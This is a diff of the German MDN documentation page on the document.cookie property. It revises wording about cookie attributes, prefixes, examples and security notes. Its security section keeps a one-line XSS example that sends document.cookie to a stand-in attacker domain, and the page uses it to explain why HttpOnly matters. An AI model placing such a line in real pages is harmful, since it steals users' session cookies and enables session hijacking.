@@ -1,58 +1,66 @@
 ---
-title: "Dokument: Cookie-Eigenschaft"
+title: "Dokument: cookie-Eigenschaft"
 short-title: cookie
 slug: Web/API/Document/cookie
 l10n:
-  sourceCommit: ca26363fcc6fc861103d40ac0205e5c5b79eb2fa
+  sourceCommit: 5ef5a171a41dbcb48c953cc3c98c1237566796e9
 ---
 
 {{APIRef("DOM")}}
 
-Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht es Ihnen, die [Cookies](/de/docs/Web/HTTP/Guides/Cookies), die mit dem Dokument verbunden sind, zu lesen und zu schreiben. Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.
+Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht das Lesen und Schreiben von [Cookies](/de/docs/Web/HTTP/Guides/Cookies), die mit dem Dokument verknüpft sind.
+Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.
 
 > [!NOTE]
-> Das `document.cookie` kann eine Quelle von Leistungsproblemen sein, da es sich um eine synchrone API handelt, die den Haupt-Thread blockiert, wenn Cookies über Prozesse gelesen oder I/O-Operationen durchgeführt werden. Entwickler sollten nach Möglichkeit die asynchrone [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) verwenden, um Cookies zu verwalten.
+> Das `document.cookie` kann eine Quelle von Leistungsproblemen sein, da es sich um eine synchrone API handelt, die den Haupt-Thread blockiert, wenn Cookies über Prozesse hinweg gelesen oder I/O-Operationen durchgeführt werden. Entwickler sollten nach Möglichkeit die asynchrone [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) verwenden, um Cookies zu verwalten.
 
 ## Wert
 
-Ein String, der eine durch Semikolons getrennte Liste aller Cookies (d.h. `key=value`-Paare) enthält. Beachten Sie, dass jedes _key_ und _value_ von Leerzeichen (space und tab characters) umgeben sein kann: Tatsächlich schreibt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon vor, aber einige Benutzeragenten halten sich möglicherweise nicht daran.
+Ein String, der eine durch Semikolon getrennte Liste aller Cookies (d.h. `key=value`-Paare) enthält.
+Beachten Sie, dass jedes _key_ und _value_ von Leerzeichen (Leer- und Tabulatorzeichen) umgeben sein kann: Tatsächlich verlangt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon, aber einige User Agents halten sich möglicherweise nicht daran.
 
-Sie können dieser Eigenschaft auch einen String der Form `"key=value"` zuweisen, um das Cookie zu setzen/aktualisieren. Beachten Sie, dass Sie mit dieser Methode nur ein einziges Cookie gleichzeitig setzen/aktualisieren können. Beachten Sie auch, dass:
+Sie können dieser Eigenschaft auch einen String in der Form `"key=value"` zuweisen, um das Cookie festzulegen/zu aktualisieren. Beachten Sie, dass Sie mit dieser Methode nur ein einziges Cookie gleichzeitig festlegen/aktualisieren können. Berücksichtigen Sie auch, dass:
 
-- Eines der folgenden Cookie-Attributwerte optional dem Schlüssel-Wert-Paar folgen kann, jeweils mit einem Semikolon als Trennzeichen:
-  - `;domain=domain` (z.B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird. Wenn nicht angegeben, ist dies standardmäßig der Hostanteil des aktuellen Dokument-Standorts, und das Cookie ist auf Subdomains nicht verfügbar. Wenn eine Domain angegeben ist, sind Subdomains immer eingeschlossen. Entgegen früheren Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser können es ablehnen, das Cookie mit solchen Punkten zu setzen.
+- Jeder der folgenden Cookie-Attributwerte optional auf das Schlüssel-Wert-Paar folgen kann, wobei jeder durch ein Semikolon getrennt ist:
+  - `;domain=domain` (z.B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird.
+    Wenn nicht angegeben, ist der Standard der Hostanteil des aktuellen Dokumentstandorts, und das Cookie ist auf Subdomains nicht verfügbar.
+    Wenn eine Domain angegeben ist, sind Subdomains immer enthalten.
+    Entgegen früherer Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser können es ablehnen, das Cookie zu setzen, das solche Punkte enthält.
 
     > [!NOTE]
     > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
-    > Cookies zu fremden Domains zu setzen, wird stillschweigend ignoriert.
+    > Cookies, die auf fremde Domains gesetzt werden, werden stillschweigend ignoriert.
 
   - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben ist, läuft es am Ende der Sitzung ab.
 
     > [!WARNING]
-    > Wenn der Datenschutz des Benutzers ein Anliegen ist, ist es wichtig, dass jede Web-App-Implementierung Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich darauf zu verlassen, dass der Browser dies übernimmt.
-    > Viele Browser erlauben es Benutzern anzugeben, dass Cookies niemals ablaufen sollen, was nicht unbedingt sicher ist.
+    > Wenn der Schutz der Privatsphäre der Benutzer eine Rolle spielt, ist es wichtig, dass jede Webanwendung die Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich darauf zu verlassen, dass der Browser dies tut.
+    > Viele Browser erlauben es Benutzern, anzugeben, dass Cookies niemals ablaufen sollten, was nicht unbedingt sicher ist.
 
     Siehe {{jsxref("Date.toUTCString()")}} für Hilfe beim Formatieren dieses Werts.
 
   - `;max-age=max-age-in-seconds`: Die maximale Lebensdauer des Cookies in Sekunden (z.B. `60*60*24*365` oder 31536000 für ein Jahr).
 
-  - `;partitioned`: Gibt an, dass das Cookie mit partitioniertem Speicher gespeichert werden soll. Siehe [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies) für weitere Details.
+  - `;partitioned`: Gibt an, dass das Cookie in partitioniertem Speicher gespeichert werden soll. Weitere Details finden Sie unter [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Guides/Third-party_cookies/Partitioned_cookies).
 
-  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Definieren, wo Cookies gesendet werden](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für mehr Informationen).
+  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Definieren, wo Cookies gesendet werden](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für weitere Informationen).
 
-  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server gesetzt werden, um anzugeben, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Kontrollieren von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
-    - Der Wert `lax` sendet das Cookie für alle gleichseitigen Anfragen und GET-Anfragen für die Navigation auf oberster Ebene. Dies reicht aus, um Benutzer zu verfolgen, verhindert jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF)-Angriffe. Dies ist der Standardwert in modernen Browsern.
-    - Der Wert `strict` verhindert, dass das Cookie von dem Browser in allen kontextübergreifenden Browsing-Kontexten an die Zielseite gesendet wird, selbst wenn einem regulären Link gefolgt wird.
-    - Der Wert `none` gibt ausdrücklich an, dass keine Einschränkungen angewendet werden. Das Cookie wird in allen Anfragen gesendet - sowohl übergreifend als auch gleichseitig.
+  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server gesetzt werden, um festzulegen, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuerung von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
+    - Der Wert `lax` sendet das Cookie für alle gleichseitigen Anfragen und Navigations-GET-Anfragen auf oberster Ebene.
+      Dies reicht aus, um Benutzer zu verfolgen, verhindert aber viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF)-Angriffe.
+      Dies ist der Standardwert in modernen Browsern.
+    - Der Wert `strict` verhindert, dass das Cookie vom Browser an die Zielsite in allen plattformübergreifenden Browsing-Kontexten gesendet wird, selbst beim Folgen eines regulären Links.
+    - Der Wert `none` gibt ausdrücklich an, dass keine Einschränkungen angewendet werden.
+      Das Cookie wird bei allen Anfragen gesendet – sowohl plattformübergreifend als auch gleichseitig.
 
-  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden soll.
+  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden sollte.
 
-- Der Cookie-Wert-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht erlaubt sind).
-- Der Cookie-Name kann ein Präfix haben, das spezifische Einschränkungen für die Attribute des Cookies in unterstützenden Benutzeragenten auferlegt. Alle Cookie-Präfixe beginnen mit einem Doppel-Understcore (`__`) und enden mit einem Bindestrich (`-`). Die folgenden Präfixe sind definiert:
+- Der Cookie-Wert-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht zulässig sind).
+- Der Cookie-Name kann ein Präfix haben, das bei unterstützenden User Agents spezifische Einschränkungen auf die Attribute des Cookies imposiert. Alle Cookie-Präfixe beginnen mit einem doppelten Unterstrich (`__`) und enden mit einem Bindestrich (`-`). Die folgenden Präfixe sind definiert:
   - **`__Secure-`**: Cookies mit Namen, die mit `__Secure-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden.
-  - **`__Host-`**: Cookies mit Namen, die mit `__Host-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden. Zusätzlich dürfen sie kein `Domain`-Attribut haben, und das `Path`-Attribut muss auf `/` gesetzt werden. Dies garantiert, dass solche Cookies nur an den Host gesendet werden, der sie gesetzt hat, und nicht an einen anderen Host auf der Domain. Es garantiert auch, dass sie hostübergreifend gesetzt werden und auf keinem Pfad auf diesem Host überschrieben werden können. Diese Kombination ergibt ein Cookie, das so nah wie möglich behandelt wird, als wäre es eine Sicherheitsgrenze für den Ursprung.
-  - **`__Http-`**: Cookies mit Namen, die mit `__Http-` beginnen, müssen mit der `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und zusätzlich das `HttpOnly`-Attribut haben, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden (sie können nicht über JavaScript-Funktionen wie `Document.cookie` oder die [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) gesetzt oder geändert werden).
-  - **`__Host-Http-`**: Cookies mit Namen, die mit `__Host-Http-` beginnen, müssen mit der `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt und mit dem `HttpOnly`-Attribut versehen sein, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden. Darüber hinaus haben sie auch die gleichen Einschränkungen wie Cookies mit `__Host-`-Präfix. Diese Kombination führt zu einem Cookie, das so nah wie möglich behandelt wird, als wäre es eine Sicherheitsgrenze für den Ursprung, und gleichzeitig sicherstellt, dass Entwickler und Serverbetreiber wissen, dass ihr Umfang auf HTTP-Anfragen beschränkt ist.
+  - **`__Host-`**: Cookies mit Namen, die mit `__Host-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden. Außerdem dürfen sie kein `Domain`-Attribut angegeben haben, und das `Path`-Attribut muss auf `/` gesetzt sein. Dies garantiert, dass solche Cookies nur an den Host gesendet werden, der sie gesetzt hat, und nicht an einen anderen Host auf der Domain. Es garantiert auch, dass sie hostweit gesetzt werden und auf keinem Pfad auf diesem Host überschrieben werden können. Diese Kombination ergibt ein Cookie, das so nah wie möglich daran ist, den Ursprung als Sicherheitsgrenze zu behandeln.
+  - **`__Http-`**: Cookies mit Namen, die mit `__Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und außerdem muss das `HttpOnly`-Attribut gesetzt sein, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden (sie können nicht über JavaScript-Funktionen wie `Document.cookie` oder die [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) gesetzt oder geändert werden).
+  - **`__Host-Http-`**: Cookies mit Namen, die mit `__Host-Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und müssen das `HttpOnly`-Attribut gesetzt haben, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden. Darüber hinaus haben sie auch die gleichen Einschränkungen wie Cookies mit `__Host-`-Präfix. Diese Kombination ergibt ein Cookie, das so nah wie möglich daran ist, den Ursprung als Sicherheitsgrenze zu behandeln und gleichzeitig sicherzustellen, dass Entwicklern und Serverbetreibern klar ist, dass sein Umfang auf HTTP-Anfragen beschränkt ist.
 
   > [!NOTE]
   > Der Bindestrich wird als Teil des Präfixes betrachtet.
@@ -61,11 +69,11 @@ Sie können dieser Eigenschaft auch einen String der Form `"key=value"` zuweisen
   > Diese Flags können nur mit dem `secure`-Attribut gesetzt werden.
 
 > [!NOTE]
-> Die `document.cookie`-Eigenschaft ist eine [Accessor-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _keine_ [Daten-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen, alles wird immer vom JavaScript-Interpreter vermittelt.
+> Die `document.cookie`-Eigenschaft ist eine [Accessor-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _keine_ [Daten-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen, alles wird immer vom JavaScript-Interpreter vermittelt.
 
 ## Beispiele
 
-### Beispiel 1: Einfache Verwendung
+### Beispiel 1: Einfache Nutzung
 
 ```html
 <button id="show">Show cookies</button>
@@ -97,7 +105,7 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}
 
-### Beispiel 2: Ein Beispiel-Cookie mit dem Namen test2 abrufen
+### Beispiel 2: Ein Beispiel-Cookie namens test2 abrufen
 
 ```html
 <button id="show">Show cookie value</button>
@@ -135,7 +143,7 @@ clearBtn.addEventListener("click", () => {
 
 ### Beispiel 3: Etwas nur einmal tun
 
-Um den folgenden Code verwenden zu können, ersetzen Sie bitte alle Vorkommen des Wortes
+Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes
 `doSomethingOnlyOnce` (der Name des Cookies) durch einen benutzerdefinierten Namen.
 
 ```html
@@ -207,7 +215,7 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}
 
-### Beispiel 5: Überprüfen, ob ein Cookie existiert
+### Beispiel 5: Existenz eines Cookies überprüfen
 
 ```html
 <button id="check">Check a cookie exists</button>
@@ -244,7 +252,7 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}
 
-### Beispiel 6: Überprüfen, ob ein Cookie einen bestimmten Wert hat
+### Beispiel 6: Überprüfen, dass ein Cookie einen bestimmten Wert hat
 
 ```html
 <button id="check">Check that a cookie has a specific value</button>
@@ -273,24 +281,32 @@ clearBtn.addEventListener("click", () => {
 
 ## Sicherheit
 
-Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Zugriff auf das Cookie von einem anderen Pfad schützt. Es kann leicht durch das DOM umgangen werden, zum Beispiel durch Erstellen eines versteckten {{HTMLElement("iframe")}}-Elements mit dem Pfad des Cookies und dann Zugriff auf die `contentDocument.cookie`-Eigenschaft dieses iframes. Der einzige Weg, das Cookie zu schützen, ist die Verwendung einer anderen Domain oder Subdomain, aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Defenses/Same-origin_policy).
+Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies von einem anderen Pfad schützt.
+Es kann leicht umgangen werden, indem im DOM beispielsweise ein verstecktes {{HTMLElement("iframe")}}-Element mit dem Pfad des Cookies erstellt wird, dann auf die `contentDocument.cookie`-Eigenschaft dieses iframes zugegriffen wird.
+Der einzige Weg, das Cookie zu schützen, besteht darin, eine andere Domain oder Subdomain zu verwenden, aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Defenses/Same-origin_policy).
 
-Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und dessen authentifizierte Sitzung zu identifizieren. Das Stehlen eines Cookies von einer Webanwendung führt zur Übernahme der authentifizierten Benutzersitzung. Häufige Wege, um Cookies zu stehlen, sind die Verwendung von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder das Ausnutzen einer {{Glossary("Cross-site_scripting", "Cross-Site-Scripting")}} (XSS)-Schwachstelle in der Anwendung -
+Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren.
+Das Stehlen eines Cookies von einer Webanwendung führt zur Entführung der authentifizierten Sitzung des Benutzers.
+Häufige Methoden zum Stehlen von Cookies umfassen den Einsatz von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder das Ausnutzen einer {{Glossary("Cross-site_scripting", "Cross-Site Scripting")}} (XSS)-Schwachstelle in der Anwendung -
 
 ```js
 new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
-Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem es den Zugriff auf den Cookie-Wert über JavaScript verhindert. Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
+Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem es den Zugriff auf Cookie-Werte über JavaScript verhindert.
+Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
 
 ## Hinweise
 
-- Ab Firefox 2 steht ein besserer Mechanismus für clientseitige Speicherung zur Verfügung - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
-- Sie können ein Cookie löschen, indem Sie dessen Ablaufzeit auf null setzen.
-- Beachten Sie, dass je mehr Cookies Sie haben, desto mehr Daten bei jeder Anfrage zwischen dem Server und dem Client übertragen werden. Dies wird jede Anfrage verlangsamen. Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "Client-only"-Daten behalten möchten.
-- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementation Limits") gibt an, dass es **keine maximale Länge** der Schlüssel- oder Wertgröße eines Cookies geben sollte und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen. Die maximale Kapazität der Implementierung jedes Browsers wird zwangsläufig unterschiedlich sein, daher konsultieren Sie die individuelle Browserdokumentation.
+- Ab Firefox 2 ist ein besserer Mechanismus für die clientseitige Speicherung verfügbar - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
+- Sie können ein Cookie löschen, indem Sie seine Ablaufzeit auf null setzen.
+- Bedenken Sie, dass je mehr Cookies Sie haben, desto mehr Daten zwischen dem Server und dem Client für jede Anfrage übertragen werden.
+  Dies macht jede Anfrage langsamer.
+  Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "nur klientseitige" Daten speichern möchten.
+- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementation Limits") gibt an, dass es **keine maximale Länge** für die Größe des Schlüssel- oder Wert-Strings eines Cookies geben sollte, und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen.
+  Die maximale Implementierung in jedem Browser wird zwangsläufig unterschiedlich sein, daher konsultieren Sie die Dokumentation des jeweiligen Browsers.
 
-Der Grund für die Asymmetrie zwischen dem Abrufen und Festlegen der `document.cookie`-Accessor-Eigenschaft liegt in der Client-Server-Natur der Cookies, die sich von anderen Client-Client-Speichermethoden (wie zum Beispiel [localStorage](/de/docs/Web/API/Web_Storage_API)) unterscheidet:
+Der Grund für die Asymmetrie zwischen dem Abrufen und Festlegen der `document.cookie`-Accessor-Eigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden unterscheidet (wie z.B. [localStorage](/de/docs/Web/API/Web_Storage_API)):
 
 - Der Server weist den Client an, ein Cookie zu speichern:
 
